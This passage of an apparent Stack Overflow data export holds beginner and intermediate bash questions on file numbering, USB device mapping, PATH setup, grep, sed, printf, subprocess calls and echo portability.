id to multiple files with a continuous count in bash","body":"<p>Say I have files A.tsv, B.tsv, and C.tsv.</p>\n\n<p>Doing <code>cat -n A.tsv &gt; A-id.tsv</code> is the output that I want for one file. How do you make a simple bash command to process all 3 files such that the row ID is continuous from the previous file and such that I can get 3 separate files, A-id.tsv, B-id.tsv, and C-id.tsv?</p>\n\n<p>For example, if A.tsv has 3 lines, then B.tsv would start with 4 in an output format similar to <code>cat -n B.tsv</code>.</p>\n"},{"tags":["linux","bash","usb-mass-storage","usbdevice"],"answer_count":4,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":2137,"score":2,"question_id":3881449,"title":"Find which drive corresponds to which USB mass storage device in Linux","body":"<p>I have several USB mass storage flash drives connected to a Ubuntu Linux computer (Ubuntu 10.04.1, kernel 2.6.32-25-386), and I need to tell them apart programatically (from bash if possible, but I'm not afraid of compiling either) - I need to find which block device corresponds to which <em>physical</em> device (e.g. <code>/dev/sdb1</code> -> device in USB port 1; in my case, one device ~ one volume). </p>\n\n<p>In other words, I know that I have three hardware devices plugged into USB ports; each of them shows up in the system as a USB mass storage device (as seen with lsusb), is created as a block device (<code>/dev/sdb1</code>) and automounted by UUID (<code>/media/1234-5678</code>).</p>\n\n<pre><code>USB device               block device    mountpoint\nUSB device in port 2.2 &lt;-&gt; /dev/sdb1   &lt;-&gt; /media/1234-5678\n</code></pre>\n\n<p>I'm <em>not</em> trying to find the relationship between block device and mountpoint; <strong>I'm trying to find the relationship between block device and USB device, is there a way?</strong></p>\n\n<p>Why? There will be some writes on the disks, with unpredictable time of completion. I need to give the operator some indication like \"you can now remove the disk in port 2 (which is second from the left)\". I have found which physical port corresponds to which port number on that specific machine, and finding block devices from mountpoints is simple; now I'm stuck mapping the logical USB ports to block devices.</p>\n\n<p>I can see the disks with lsusb :</p>\n\n<pre><code>Bus 001 Device 058: ID 067b:2517 Prolific Technology, Inc. Mass Storage Device\nBus 001 Device 060: ID 067b:2517 Prolific Technology, Inc. Mass Storage Device\nBus 001 Device 061: ID 067b:2517 Prolific Technology, Inc. Mass Storage Device\n</code></pre>\n\n<p>and I can see them mounted (by their UUID):</p>\n\n<pre><code>/dev/sdb1 on /media/BC88-15C4 type vfat\n/dev/sdc1 on /media/AE54-65AA type vfat\n/dev/sdd1 on /media/58D2-FED1 type vfat\n</code></pre>\n\n<p>Now, all the drives are the same model from the same manufacturer, so I can't distinguish them by that, and I can't guarantee they'll be plugged in a particular order.</p>\n\n<p>I have found <code>/sys/bus/usb/devices</code> (a list of USB devices), but it seems to be the same data that I get from lsusb - I don't see a mapping to disks there.</p>\n\n<p>There's also <code>/sys/block/sdb</code> and <code>/sys/block/sdb/sdb1</code> (the block device and its first partition; similarly for <code>sdc</code> and <code>sdd</code>), but again, I see no mapping to devices.</p>\n"},{"tags":["osx","bash","path","environment-variables","command-path"],"answer_count":17,"favorite_count":185,"up_vote_count":205,"down_vote_count":0,"view_count":146485,"score":205,"question_id":135688,"title":"Setting environment variables in OS X?","body":"<p>What is the proper way to modify environment variables like PATH in OS X? I've looked on google a little bit and found 3 different files to edit: </p>\n\n<ul>\n<li>/etc/paths</li>\n<li>~/.profile</li>\n<li>~/.tcshrc</li>\n</ul>\n\n<p>I don't even have some of these, and I'm pretty sure that .tcshrc is wrong, since osx uses bash now. Anybody have any idea where these variables, especially PATH, are defined?</p>\n\n<p>Edit: I'm running OS X 10.5</p>\n"},{"tags":["bash","prompt"],"answer_count":7,"favorite_count":2,"up_vote_count":4,"down_vote_count":0,"view_count":964,"score":4,"question_id":278398,"title":"Going backwards in a bash prompt","body":"<p>I'd like to have a blank line after my bash prompt and before the output on my Mac. It should look like this would:</p>\n\n<pre><code>echo; ls\n</code></pre>\n\n<p>Can I add a newline to my bash prompt and then go back up one line to wait for user input? Is there something obvious I'm missing?</p>\n"},{"tags":["python","bash","python-3.x","pipe"],"answer_count":1,"favorite_count":1,"up_vote_count":3,"down_vote_count":0,"view_count":46,"score":3,"question_id":13011652,"title":"Creating a pipe from the inside of the python interpreter","body":"<p>sometimes i just want to quickly redirect a large output to an external program, supposing that in Python 3.x i have</p>\n\n<pre><code>&gt;&gt;&gt; import sys\n&gt;&gt;&gt; sys.modules.keys()\n</code></pre>\n\n<p>how i can redirect the output of</p>\n\n<pre><code>&gt;&gt;&gt; sys.modules.keys()\n</code></pre>\n\n<p>to a specific command or application ?</p>\n"},{"tags":["linux","bash","grep"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":59,"score":0,"question_id":13018294,"title":"Loops with grep script","body":"<p>I'm asking this as a new question because people didn't seem to understand my original question.</p>\n\n<p>I can figure out how to find if a word starts with a capital and is followed by 9 letters with the code:</p>\n\n<pre><code>echo \"word\" | grep -Eo '^[A-Z][[:alpha:]]{8}'\n</code></pre>\n\n<p>So that's part 1 of what I'm supposed to do. My actual script is supposed to loop through each word in a text file that is given as the first and only argument, then check if any of those words start with a capital and are 9 letters long.</p>\n\n<p>I've tried:</p>\n\n<pre><code>cat textfile | grep -Eo '^[A-Z][[:alpha:]]{8}'\n</code></pre>\n\n<p>and</p>\n\n<pre><code>while read p\ndo echo $p | grep -Eo '^[A-Z][[:alpha:]]{8}' \ndone &lt; $1\n</code></pre>\n\n<p>to no avail.</p>\n\n<p>Although:</p>\n\n<pre><code>cat randomtext.txt \n</code></pre>\n\n<p>outputs: </p>\n\n<pre><code>The loud Brown Cow jumped over the White Moon. November October tesTer Abcdefgh Abcdefgha\n</code></pre>\n\n<p>so it's correctly outputting all the words in the file randomtext.txt</p>\n\n<p>then why wouldn't</p>\n\n<pre><code>cat randomtext.txt | grep -Eo '^[A-Z][[:alpha:]]{8}'\n</code></pre>\n\n<p>work?</p>\n"},{"tags":["php","osx","bash","applescript","osascript"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":48,"score":0,"question_id":13017514,"title":"PHP not properly executing bash script","body":"<p>I am creating a simple web page that will allow the user to select an option on a basic php page, click submit, and then the backend PHP should execute a bash script, that will execute some AppleScript. </p>\n\n<p>I can run the bash script from Terminal and it runs the Applescript file fine using <code>osascript</code> but when I try executing the bash script from php, it will run echo commands, but will not execute the <code>osascript</code> line. I imagine this is a permissions issue, but I changed everything to full privilege using <code>chmod 777</code> (admittedly not the best idea, but that is besides the point)</p>\n\n<p>Is there something I am missing? It is weird that it seems to skip completely over the <code>osascript</code> line. Any suggestions? Thanks in advance!</p>\n\n<p><strong>CODE:</strong></p>\n\n<p><strong>PHP</strong></p>\n\n<pre><code>&lt;?php\nif (isset($_POST['submit'])) {\n    $username =  $_POST['username'];\n    if (strcasecmp($username, 'user1') == 0) {\n        echo 'test1';\n    } else if (strcasecmp($username, 'user2') == 0) {\n        echo 'test2';\n    } else if (strcasecmp($username, 'user3') == 0) {\n        echo 'test3';\n    } else if (strcasecmp($username, 'user4') == 0) {\n        shell_exec('cd ~/Sites;./a.out');\n    }\n}\n?&gt;\n</code></pre>\n\n<p><strong>BASH</strong></p>\n\n<pre><code>#!/bin/bash\necho \"test String\"\ncd /Users/Zimmerman/Library/Scripts\nosascript /Users/Zimmerman/Library/Scripts/testscript.scpt\necho \"test String\"\n</code></pre>\n"},{"tags":["bash"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":30,"score":0,"question_id":13016455,"title":"Is it possible to output this integer as float of the following form using printf?","body":"<p>In a script, I store the accumulated time in ms from executing several commands in a variable, lets call it <code>total_elapsed_Time</code>. This contains e.g. values like</p>\n\n<pre><code>1001\n</code></pre>\n\n<p>or </p>\n\n<pre><code>12\n</code></pre>\n\n<p>Now, what I want is to output this value in the following form (the time in s with training milliseconds)</p>\n\n<pre><code>1.001\n</code></pre>\n\n<p>for the first value,</p>\n\n<pre><code>0.012\n</code></pre>\n\n<p>for the second value. At the moment, I do it like this</p>\n\n<pre><code>printf '%d.%03d s' \"$((total_elapsed_time / 1000))\" \"$((total_elapsed_time % 1000))\"\n</code></pre>\n\n<p>This is okay, and seems to work but I wonder if there is no easier way (so that I only needs to pass the variable to printf and printf takes care of formatting the number).</p>\n"},{"tags":["bash","shell","script","esql"],"answer_count":3,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":31,"score":3,"question_id":13016160,"title":"How can i write a shell script program where i can go through all my esql files and then execute that file to create exe files","body":"<p>This is what I mean:</p>\n\n<pre><code>ls -l *.ec\n</code></pre>\n\n<p>For each result found, I would like to compile it one at a time.</p>\n\n<p>e.g., for $something.ec:</p>\n\n<pre><code>esql $something.ec -o $something\n</code></pre>\n\n<p>$something.ec is original file</p>\n\n<p>$something is target exe file.</p>\n\n<p>My question is: how can I put that into a loop to go through all the files in my directory?</p>\n\n<p>Thank you.</p>\n"},{"tags":["bash","shell","tail","head"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":28,"score":0,"question_id":13015935,"title":"User input choice with either head or tail command","body":"<p>I want to prompt a user via command line &amp; ask what specific rows need to be cut from a data file using either head or tail. My script will employ head and tail using the inputs as variables for both head and tail commands. This is what I have thus far along with the error message: </p>\n\n<pre><code>echo -n \"What rows need to be cut from your data file: \"\nread before\nread after\nhead -n $before /home/rent_list\ntail -n $after /home/rent_list \n</code></pre>\n\n<p>Error message:</p>\n\n<pre><code>-bash: ./rent_list: bin/bash: bad interpreter: No such file or directory\n</code></pre>\n\n<p><strong>Update:</strong> This is what I am getting now:</p>\n\n<pre><code> What rows need to be cut from your data file: 4\n\nMack Tools  Milwaukee Wisconsin mj414@yahoo.com 414 2248893\nTerry Tools Orlando Florida 407@yahoo.com 407 2439812\nPark Tools  Riviera Beach Florida tp123@hotmail.com 516 5370923\nBike Tools  Orlando Florida baptiste41@gmail.com 407 3420983\ntail: /home/renter_list: invalid number of lines\n</code></pre>\n"},{"tags":["bash","shell","sed","awk","sh"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":50,"score":0,"question_id":12975834,"title":"Trimming pathnames beyond a keyword (awk, sed, ?)","body":"<p>I want to trim a pathname beyond a certain point after finding a keyword.  I'm drawing a blank this morning.</p>\n\n<p>/home/quikq/1.0/dev/Java/tsupdater/src/tsupdater.java</p>\n\n<p>I want to find the keyword Java, save the pathname beyond that (tsupdater), then cut everything off after the \"Java\" portion.</p>\n"},{"tags":["php","linux","bash"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":62,"score":0,"question_id":13014842,"title":"long running php script hangs","body":"<p>I have this set in my php script to make it supposedly run as long as it needs to to parse and do mysql queries and fetch images for over 100,000 rows.</p>\n\n<pre><code>ignore_user_abort(true);\nset_time_limit(0);\n#begin logging output\nerror_reporting(E_ALL);\nini_set('memory_limit', '512M');\n</code></pre>\n\n<p>I run the command like this in shell:</p>\n\n<pre><code>nohup php myscript.php &gt; output.txt\n</code></pre>\n\n<p>after running about 8 to 10 hours this script will still be running but execution just stops... no more output..  it's not a zombie process I checked top.  It hasn't met the memory limit either and if it did wouldn't it exit?</p>\n\n<p>What is going on?  It's a real pain to babysit this script and write custom code to nudge it along.  What is going on?  I read up on unix maybe cleaning up zombies but it's not a zombie.  I know it's not php settings.. and it's not running through a webserver it's from command line only so what gives.</p>\n"},{"tags":["bash"],"answer_count":4,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":61,"score":2,"question_id":13010420,"title":"Bash ignore error and get return code","body":"<p>I am using <code>set -e</code> to abort on errors. </p>\n\n<p>But for particular one function I want to ignore error and on error I want return code of the function. </p>\n\n<p>Example:</p>\n\n<pre><code>do_work || true \n if [ $? -ne 0 ] \n  then\n   echo \"Error\"\n  fi  \n</code></pre>\n\n<p>But it is not work return code is always true due || true </p>\n\n<p>How to get return code on do_work on error ?</p>\n"},{"tags":["bash","shell"],"answer_count":5,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":97,"score":2,"question_id":13003217,"title":"Find the last Saturday of the month in a bash script","body":"<p>I'm making a backup script in which I need to find the last Saturday of each month.</p>\n\n<p>I've tried different approaches to finding the day itself, which works splendidly themselves.</p>\n\n<p>The problem is, when I try putting them into my script I always get the error code\n<code>./test.sh: line 13: [: 29: integer expression expected</code>.</p>\n\n<p>This is my code:</p>\n\n<pre><code>#!/bin/bash\n\nLASTSAT=$(ncal | grep Sa | awk '{print$(NF-0)}')\nSATURDAY=\"6\"\n\nDAY=$(date +\"%u\")\nDATE=$(date +\"%d\")\n\necho \"$DAY\"\necho \"$DATE\"\necho \"$LASTSAT\"\n\nif [ $DATE -eq $LASTSAT  ]\nthen\n echo \"sista lördagen...\"\nfi\n</code></pre>\n\n<p>I got the tip to change the if statements to <code>[ \"$DATE\" = \"$LASTSAT\" ]</code>\nwhich erased the error itself, but the script will somehow not equal 27 to 27 (to take this month as an example).</p>\n\n<p>I also tried another approach to finding the last Saturday which was <code>LASTSAT=$(cal|awk '{if(NF==7){SAT=$7}};END{print SAT}')</code>, but it returns the exact same error if I use -eq and doesn't equal 27 to 27 using \" with =</p>\n\n<p>I'm very confused and out of ideas and I have searched the internet and copied the exact lines others been using but it all ends up the same.</p>\n\n<p>What am I doing wrong?</p>\n"},{"tags":["linux","bash","audio","audio-recording"],"answer_count":2,"favorite_count":2,"up_vote_count":7,"down_vote_count":0,"view_count":590,"score":7,"question_id":2613163,"title":"Monitoring an audio line","body":"<p>I need to monitor my audio <strong>line-in</strong> in linux, and in the event that audio is played, the sound must be recorded and saved to a file. Similiar to how <strong><a href=\"http://www.lavrsen.dk/twiki/bin/view/Motion/WebHome\" rel=\"nofollow\">motion</a></strong> monitors the video feed.</p>\n\n<p>Is it possible to do this with bash? something along the lines of:</p>\n\n<pre><code>#!/bin/bash\n\n# audio device\ndevice=/dev/audio-line-in\n\n# below this threshold audio will not be recorded.\nnoise_threshold=10\n\n# folder where recordings are stored\nstorage_folder=~/recordings\n\n# run indefenitly, until Ctrl-C is pressed\nwhile true; do\n   # noise_level() represents a function to determine\n   # the noise level from device\n   if noise_level( $device ) &gt; $noise_threshold; then\n     # stream from device to file, can be encoded to mp3 later.\n     cat $device &gt; $storage_folder/$(date +%FT%T).raw         \n   fi;\ndone;\n</code></pre>\n\n<p>EDIT: The flow I'd like to get from this program is</p>\n\n<pre><code> a. when noise &gt; threshold, start recording  \n b. stop recording when noise &lt; threshold for 10 seconds\n c. save recorded piece to separate file\n</code></pre>\n"},{"tags":["linux","bash","echo"],"answer_count":5,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":76,"score":0,"question_id":13005226,"title":"Save one line of echo to variable in BASH?","body":"<p>Okay the answer to this may be really simple but I have been searching for a while and I can't figure it out. I have a variable called \"tmessagef\". The variable is formatted like:</p>\n\n<pre><code>value1*value2*vlaue3*value4*value5\n</code></pre>\n\n<p>The only part of the variable I want is value 5. I am currently using the following code but it only prints each value and doesn't save them to a variable:</p>\n\n<pre><code>OIFS=$IFS\nIFS='*'\narr2=$tmessagef\nfor x in $arr2\ndo\n    echo \"$x\"\ndone\nIFS=$OIFS\n</code></pre>\n\n<p>What I want to do is get the 5th line that the echo command produces and save that to a variable called \"tmessage\". How would I go about doing this?</p>\n\n<p>Thanks in advance.</p>\n"},{"tags":["arrays","bash","store"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":43,"score":1,"question_id":13007360,"title":"How to store elements to an array in bash","body":"<p>I got again tiny problem I would like to store strings in array I got following code: </p>\n\n<pre><code>echo -e \"Enter an amount\"\nread n \nfor  ((i=0;i&lt;n;i++)); \ndo \necho \"Enter number $i \" \nread ${array[$i]} \ndone \necho -e \"$array[@]}\"\n</code></pre>\n\n<p>Can you have a quick look a help me ? \nThanks</p>\n"},{"tags":["xcode","bash","shell"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":33,"score":2,"question_id":13011146,"title":"How to stop Xcode build from shell script","body":"<p>I am currently working on an app in Xcode where I've added a Build Phase that runs a shell script. </p>\n\n<p>The script looks for resources from the Desktop and copies them to the app . If the files/folders don't exist, the script should cancel the build of the app. </p>\n\n<p>I have tried various things to stop the build such as <code>xcodebuild clean</code> but I can't quite figure it out. Here is what I have:</p>\n\n<pre><code>if [ -d ~/Desktop/MyFolder ]; then\n    cp -r ~/Desktop/MyFolder ${CONFIGURATION_BUILD_DIR}/${UNLOCALIZED_RESOURCES_FOLDER_PATH}/MyFolder\nelse\n    #Stop the build\nfi\n</code></pre>\n\n<p>Is there a way to have the script tell Xcode to stop the build? If so, how can I do it? </p>\n"},{"tags":["linux","bash","ps"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":47,"score":0,"question_id":13012265,"title":"Meaning of columns from ps","body":"<p>In Linux bash, what do the four columns mean from <code>ps</code>?</p>\n\n<p>e.g</p>\n\n<pre><code>PID   TTY         TIME CMD\n15286 pts/498 00:00:00 bash\n30887 pts/498 00:00:00 ps\n</code></pre>\n"},{"tags":["windows","linux","bash","shell","wget"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":4,"view_count":52,"score":-4,"question_id":13011741,"title":"What is wget and how to get images from a public directory ?","body":"<p>What is wget and how to get images from a public directory in windows?</p>\n"},{"tags":["python","linux","bash","shell","unix"],"answer_count":6,"favorite_count":0,"up_vote_count":9,"down_vote_count":0,"view_count":3579,"score":9,"question_id":4834483,"title":"Is this the right way to run a shell script inside Python?","body":"<pre><code>import subprocess\nretcode = subprocess.call([\"/home/myuser/go.sh\", \"abc.txt\", \"xyz.txt\"])\n</code></pre>\n\n<p>When I run these 2 lines, will I be doing exactly this?:</p>\n\n<pre><code>/home/myuser/go.sh abc.txt xyz.txt\n</code></pre>\n\n<p>Why do I get this error? But when I run go.sh normally, I don't get that error.</p>\n\n<pre><code>File \"/usr/lib/python2.6/subprocess.py\", line 480, in call\n    return Popen(*popenargs, **kwargs).wait()\n  File \"/usr/lib/python2.6/subprocess.py\", line 633, in __init__\n    errread, errwrite)\n  File \"/usr/lib/python2.6/subprocess.py\", line 1139, in _execute_child\n    raise child_exception\nOSError: [Errno 8] Exec format error\n</code></pre>\n"},{"tags":["bash","shell"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":69,"score":2,"question_id":13003339,"title":"How do I write a shell script that repeats a java program a specific number of times?","body":"<p>Essentially I am looking to write a shell script, likely using a for loop, that would allow me to repeat a program call multiple times without having to do it by hand (I don't know exactly how to explain this, but i want to perform the java TestFile.java command in the cmd window multiple times without doing it by hand).</p>\n\n<p>I am trying to write it for the UNIX shell in bash, if that helps at all.</p>\n\n<p>My program outputs a set of numbers that I want to look at to analyze end behavior, so I need to perform many tests for many different inputs and I want to streamline the process. I have a pretty basic understanding of shell scripting - i tried to teach myself today but I couldn't really understand the syntax of the for loop or the syntax of how to write a .java file call, but I would be able to write them in shell script with a little help.</p>\n"},{"tags":["bash","shell","scripting","boolean","sh"],"answer_count":1,"favorite_count":1,"up_vote_count":28,"down_vote_count":0,"view_count":22302,"score":28,"question_id":2953646,"title":"How to declare and use boolean variables in shell script?","body":"<p>The way I tried declaring a boolean variable is by:</p>\n\n<pre><code>variable=$false\n\nvariable=$true\n</code></pre>\n\n<p>Is the syntax correct? Also, if I wanted to update that variable would I just do the same format? Finally, is the following the proper syntax for using boolean variables as expressions:</p>\n\n<pre><code>if [ $variable ]\n\nif [ !$variable ]\n</code></pre>\n"},{"tags":["osx","bash"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":56,"score":1,"question_id":13009632,"title":"Getting strange behavior from terminal and iTerm \"-bash: fork: Resource temporarily unavailable\"","body":"<p>When I open iTerm, I'm getting this message:</p>\n\n<blockquote>\n  <p>Last login: Mon Oct 22 12:20:25 on ttys002\n  <br> -bash: fork: Resource temporarily unavailable\n  <br> -bash-3.2$ </p>\n</blockquote>\n\n<p>and when I open Terminal, I'm getting:</p>\n\n<blockquote>\n  <p>Last login: Mon Oct 22 12:25:47 on ttys002\n  <br>-bash: fork: Resource temporarily unavailable\n  <br>Williams-MacBook-Pro:~ william$ </p>\n</blockquote>\n\n<p>and whenever I try to put in a command, like ls or cd i get this error message:</p>\n\n<blockquote>\n  <p>-bash: fork: Resource temporarily unavailable</p>\n</blockquote>\n\n<p>So I basically can't do anything. I've tried googling the error message, but not getting anywhere. I'm on a Mac with Mountain Lion if that helps. Thanks.</p>\n\n<p>EDIT: </p>\n\n<p>I ran \"ps\"</p>\n\n<p>to get the process status and i got this as a response from terminal:</p>\n\n<blockquote>\n  <p>Williams-MacBook-Pro:~ william$ ps\n    <br>PID TTY           TIME CMD\n    <br>203 ttys000    0:00.08 -bash\n    <br>254 ttys001    0:00.03 bash /Users/william/.rvm/scripts/wrapper ruby-1.9.3-p2\n    <br>553 ttys001    0:00.03 bash /Users/william/.rvm/scripts/wrapper ruby-1.9.3-p2\n    <br>785 ttys001    0:00.03 bash /Users/william/.rvm/scripts/wrapper ruby-1.9.3-p2\n    <br>814 ttys001    0:00.48 -bash\n   <br>1019 ttys001    0:00.03 bash /Users/william/.rvm/scripts/wrapper ruby-1.9.3-p2</p>\n</blockquote>\n\n<p>and the message </p>\n\n<blockquote>\n  <p>bash /Users/william/.rvm/scripts/wrapper ruby-1.9.3-p2</p>\n</blockquote>\n\n<p>keeps listing a few hundred times in the terminal (couldn't post it all cause it probably wouldn't fit into this box and it just keeps going the same), so I'm guessing there's something sketchy going on with that file. Does anyone know how to fix this?</p>\n"},{"tags":["bash","expect","remote-access"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":61,"score":1,"question_id":12988046,"title":"Script to get info from multiple servers","body":"<p>I want to collect info from a number of servers whether their grub.conf contains the \"elevator\" parameter or not.</p>\n\n<p>Now, password-less key authentication is something I can not do as of now. I am okay with specifying password in script.</p>\n\n<p>Can someone please help me achieving this?</p>\n\n<p>This is what I did:</p>\n\n<pre><code>#!/bin/bash\n\nGRUB=\"/etc/grub.conf\"\n_pair=\"$(&lt;/home/wadhwaso/login.txt)\"\nServer_info=\"/tmp/server_info\"\nfor e in $_pair\ndo\n             # extract user and ips for each $e in $_pair\n        IFS='@'\n        set -- $e\n        _user=\"$1\"\n        _ip=\"$2\"\n\n        sleep 2\n        echo \"Connecting to server '${_ip}' via SSH...\"\n        ssh ${_user}@${_ip} \"sudo grep -q \"elevator=noop\" \"$GRUB\" &gt;/dev/null\"\n        if [ $? -eq 0 ]; then\n        echo \"Present on ${_ip}\" | tee -a \"${Server_info}\"\n        else\n        echo \"not present on ${_ip}\" | tee -a \"${Server_info}\"\n        fi\ndone\n</code></pre>\n\n<p>I don't want to give password every time, and as password-less authentication is not present in my environment and will not be possible, I have to pass the password in script itself which really doesn't bother me, I can do that. I know it could be done through expect but I messed everything every time I tried using it.</p>\n\n<p>I tried using expect the way it was told in 1st answer but I failed.</p>\n"},{"tags":["bash","outputstream","fileoutputstream"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":50,"score":1,"question_id":12790996,"title":"Output redirection in a bash script doesn't work","body":"<p>I have a script which ensures that the process keeps on running and the output of the process are being redirected to corresponding process_name.out files.</p>\n\n<p>Mysteriously (for me atleast), the output doesn't get redirected to the file unless I close down the script though the error does.</p>\n\n<p>Any clues in this regard would be really helpful.</p>\n\n<pre><code>#!/bin/bash\n\nuntil $1 &gt;&gt; \"/root/$1.out\" 2&gt;&gt;\"/root/$1.log\" ; do\n    echo \"Server $1 crashed with exit code $?.  Respawning..\" &gt;&gt; \"/root/procees.log\"\n    sleep 1\ndone\n</code></pre>\n"},{"tags":["linux","bash","unicode"],"answer_count":6,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":754,"score":4,"question_id":1044595,"title":"How can I re-add a unicode byte order marker in linux?","body":"<p>I have a rather large SQL file which starts with the byte order marker of FFFE. I have split this file using the unicode aware linux split tool into 100,000 line chunks. But when passing these back to windows, it does <em>not</em> like any of the parts other than the first one as only it has the FFFE byte order marker on.</p>\n\n<p>How can I add this two byte code using echo (or any other bash command)?</p>\n"},{"tags":["bash","unix","copy"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":53,"score":1,"question_id":13008382,"title":"Bash - How to loop through sub directories and copy in a file","body":"<p>I'm new to coding in bash.</p>\n\n<p>I'm trying to create something which will loop through all subdirectories, and within each one it should copy a file to that directory.</p>\n\n<p>So for example, if I have the following directories</p>\n\n<pre><code>/dir1/  \n/dir2/  \n/dir3/  \n...  \n...  \n/dirX/\n</code></pre>\n\n<p>And a file <code>fileToCopy.txt</code></p>\n\n<p>Then I want to run something which will open every single <code>/dirX</code> file and put <code>fileToCopy.txt</code> in that directory. Leaving me with:</p>\n\n<pre><code>/dir1/fileToCopy.txt\n/dir2/fileToCopy.txt\n/dir3/fileToCopy.txt\n...\n...\n/dirX/fileToCopy.txt\n</code></pre>\n\n<p>I would like to do this in a loop, as then I am going to try to modify this loop to add some more steps, as ultimately the .txt file is actually a .java file, I am wanting to copy it into each directory, compile it (with the other classes in there), and run it to gather the output.</p>\n\n<p>Thanks.</p>\n"},{"tags":["bash","cli","at-command"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":48,"score":0,"question_id":12968535,"title":"Echoing 'at' command in terminal fails","body":"<p>The following should print \"hello\" (or some reminder) on my Linux command line at 9:00 AM today:</p>\n\n<pre><code>$ at 9:00AM\nwarning: commands will be executed using /bin/sh\nat&gt; echo \"hello\"\nat&gt; &lt;EOT&gt; \n</code></pre>\n\n<p>However, at the specified time, nothing happens.</p>\n\n<p>I have an empty <code>etc/at.deny</code> and no <code>/etc/at.allow</code> file, so there shouldn't be any problems with permissions to use the command. Also, writing a file at 9:00 AM works:</p>\n\n<pre><code>$ at 9:00AM\nat&gt; echo \"hello\" &gt; /home/mart/hello.txt\nat&gt; &lt;EOT&gt;\n$ cat /home/mart/hello.txt\nhello\n</code></pre>\n\n<p>All jobs are shown as scheduled, I just can't get any output to the terminal window (I'm on Crunchbang Linux with Terminator). Why? Do I need to somehow specify the window for that output?</p>\n\n<p>Thanks for any help!</p>\n"},{"tags":["regex","linux","bash","script","sed"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":42,"score":0,"question_id":13008910,"title":"Use sed with regular expression for space","body":"<p>I am trying to use <code>sed</code> to substitute a string taking into account an whitespace.<br>\nExample:  </p>\n\n<pre><code>Hello          World\n</code></pre>\n\n<p>to be replaced by  </p>\n\n<pre><code>Hello George  \n</code></pre>\n\n<p>I tried:  </p>\n\n<pre><code>sed -e 's/Hello[:space]+World/Hello George/' ./infile &gt; outFile\n</code></pre>\n\n<p>but it does not work.  </p>\n\n<p>How can I fix this?  </p>\n"},{"tags":["bash","python-2.7","quotes"],"answer_count":5,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":47,"score":0,"question_id":13007501,"title":"Bash: pass variable as a single parameter / shell quote parameter","body":"<p>I'm writing a bash script which has to pass a variable to another program:</p>\n\n<pre><code>./program $variable\n</code></pre>\n\n<p>The problem is, it is absolutely necessary for $variable to be passed as a single parameter, which isn't the case if it contains whitespace.</p>\n\n<pre><code>variable=Hello World\n./program $variable\n-&gt; program receives two arguments: 'Hello' 'World'\n</code></pre>\n\n<p>Quoting it doesn't do anything at all (well done, bash devs):</p>\n\n<pre><code>variable=Hello World\n./program \"$variable\"\n-&gt; program receives: 'Hello' 'World'\n</code></pre>\n\n<p>Double quoting it does crazy stuff (well done, bash devs):</p>\n\n<pre><code>variable=Hello World\n./program \"'$variable'\"\n-&gt; program receives: \"'Hello\" \"World'\"\n</code></pre>\n\n<p>Is there an easy way to do this? Heck, is there a way to do this at all?</p>\n\n<p><strong>Update:</strong> Okay, since the problem doesn't seem to be bash, here's some additional info.\nThe program I'm passing arguments to is a python script. Without modifying the arguments in any way, I get</p>\n\n<pre><code>print sys.argv\n-&gt; ['/usr/bin/program', \"'Hello\", \"World'\"]\n</code></pre>\n\n<p>How can I fix that?</p>\n\n<p><strong>Edit:</strong> No, I haven't tried</p>\n\n<pre><code>variable=\"Hello World\"\n</code></pre>\n\n<p>because I never declare $variable. It's not being declared inside my bash function and I'm not allowed to modify it.</p>\n\n<p><strong>Edit:</strong> Okay, I got it to work that way.</p>\n\n<pre><code>local temp=\"$variable\"\n./program \"$temp\"\n</code></pre>\n\n<p>I'd like to know why it works that way and not any other way, though.</p>\n"},{"tags":["bash","ubuntu","centos","echo","sh"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":41,"score":0,"question_id":13005474,"title":"echo -e backslash escapes not being respected in sh","body":"<p>I have a shell script that I wish to run on different Linux servers. When I run the echo command with the -e option and escape characters in the string it doesn't execute as expected on the sh shell on Ubuntu 12.04 or Ubuntu 11.04. The two servers we have in use that I would like the script to work on are running CentOS 5.3 and Ubuntu 12.04. When I run the following command in bash on the two servers the expected output is produced:</p>\n\n<pre><code>$ echo -e \"line1\\nline2\"\nline1\nline2\n</code></pre>\n\n<p>When I run the same command in sh on the CentOS machine the correct output is also produced. But when I run the command in sh on Ubuntu 12.04 or 11.04 the following output is produced:</p>\n\n<pre><code>$ echo -e \"line1\\nline2\"\n-e line1\nline2\n</code></pre>\n\n<p>Interesting if I run the below in sh on Ubuntu it automatically interprets the escape characters. </p>\n\n<pre><code>$ echo \"line1\\nline2\"\nline1\nline2\n</code></pre>\n\n<p>The script needs to run in the sh shell and should be portable across different machines. Any solutions. I'd also much appreciate a link to some docs explaining why or how this stuff happens. 